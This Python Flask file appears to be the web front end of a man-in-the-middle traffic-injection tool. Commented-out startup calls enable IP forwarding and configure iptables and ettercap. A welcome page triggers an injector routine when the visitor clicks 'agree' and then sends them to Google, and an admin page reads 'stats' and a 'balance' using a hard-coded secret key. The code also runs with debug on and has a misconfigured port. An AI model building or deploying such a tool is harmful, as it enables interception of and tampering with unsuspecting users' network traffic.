#!/usr/bin/env python3

from flask import Flask, render_template, request, redirect, session
import operator
import mitmproxy
import models

app = Flask(__name__)

#def startup():
#    models.ip_forward()
#    models.config_iptables()
#    models.config_ettercap()


@app.route('/welcome', methods = ['GET','POST'])
def welcome():
    if request.method == 'GET':

        if True:
            return render_template('index.html')

    else:
        if request.form['submit'] == 'agree':
            models.injector()
            if True:
                return redirect ('http://www.google.com', code = 302)
        else:
            return redirect ('/welcome')

@app.route('/admin', methods = ['GET','POST'])
def admin():
    if request.method == 'GET':
        secret_key = 'v39MYkdyRkYqkuqbqfRGC6JbNct3Eka0'
        stats = models.get_stats(secret_key)
        balance = models.get_balance(secret_key)
        return render_template('admin.html', stats=stats, balance=balance)

    else:
        return render_template('admin.html')

if __name__ == '__main__':
    app.run(port="0.0.0.0", debug=True)
